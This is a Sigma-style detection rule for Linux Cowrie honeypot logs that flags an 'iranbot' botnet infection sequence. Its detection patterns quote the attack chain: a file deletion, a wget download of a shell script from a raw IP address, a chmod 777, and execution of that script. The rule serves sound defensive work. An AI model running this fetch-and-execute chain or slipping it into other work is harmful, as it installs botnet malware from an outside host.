title: Iranbot Malware Sequence Detection Rule
id: c1b2a3d4-e5f6-7890-abcd-1234567890ab
status: experimental
description: |
    Detects a sequence of commands (rm, wget, chmod, execute) targeting the same host 
    within a short timeframe, typical of automated botnet infections like iranbot.

    Reported by Team_D4rkn3ttz
    Detected by @wa__ri2
author: wa__ri2
date: 2026-02-15
references:
  - internal-honeypot-telemetry
logsource:
  product: linux
  category: honeypot
  service: cowrie
detection:
    step1_cleanup:
        input|contains: 'rm -rf iran.*'
    step2_download:
        input|contains: 'wget http://45.153.34.52/cat.sh'
    step3_chmod:
        input|contains: 'chmod 777 cat.sh'
    step4_execute:
        input|contains: './cat.sh'
    condition: 1 of step*

correlation:
    type: sequence
    group-by:
        - session
    timespan: 1m
    steps:
        - step1_cleanup
        - step2_download
        - step3_chmod
        - step4_execute

level: critical
tags:
  - attack.execution
  - attack.t1059.004
  - attack.t1105